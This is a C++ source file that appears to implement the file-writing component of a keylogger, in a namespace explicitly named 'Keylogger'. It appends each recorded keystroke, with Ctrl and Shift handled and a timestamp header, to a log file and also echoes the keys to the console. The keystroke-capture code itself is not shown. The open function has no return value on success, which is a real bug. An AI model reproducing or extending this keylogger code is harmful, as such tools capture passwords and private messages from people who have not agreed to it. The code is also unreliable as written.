#include "FileLogger.h"

#include <ctime>
#include <string>

namespace Keylogger {

std::string lp0(int num) {
    if (num > 9) {
        return std::to_string(num);
    }
    return "0" + std::to_string(num);
}

bool FileLogger::open(IKeycodeMapper* mapper, std::string filename) {
    _mapper = mapper;

    std::ifstream file;
    bool exists = false;

    file.open(filename);
    exists = file.is_open();
    file.close();

    _stream.open(filename, std::ios_base::app);
    if (!_stream.is_open()) {
        return false;
    }

    if (exists) {
        _stream << std::endl << std::endl;
    }

    std::time_t t = std::time(0);
    std::tm* now = std::localtime(&t);

    _stream
        << "[--- "
        << (now->tm_year + 1900) << '-' << lp0(now->tm_mon + 1) << '-' << lp0(now->tm_mday)
        << ' ' << lp0(now->tm_hour) << ':' << lp0(now->tm_min) << ':' << lp0(now->tm_sec)
        << " ---]"
        << std::endl;
}

void FileLogger::close() {
    _stream.close();
}

void FileLogger::logKeycode(int keycode, KeyState state) {
    if (_mapper) {
        if (_mapper->isCtrl(keycode)) {
            modifierCtrl = state == KeyState::Pressed;
        }
        if (_mapper->isShift(keycode)) {
            modifierShift = state == KeyState::Pressed;
        }

        if (state == KeyState::Pressed) {
            std::cout << _mapper->keycodeToStr(keycode, modifierShift);
            _stream << _mapper->keycodeToStr(keycode, modifierShift);
        }
    } else {
        _stream << keycode << ":" << (state == KeyState::Pressed ? 1 : 0) << " ";
    }
    _stream.flush();
}

}
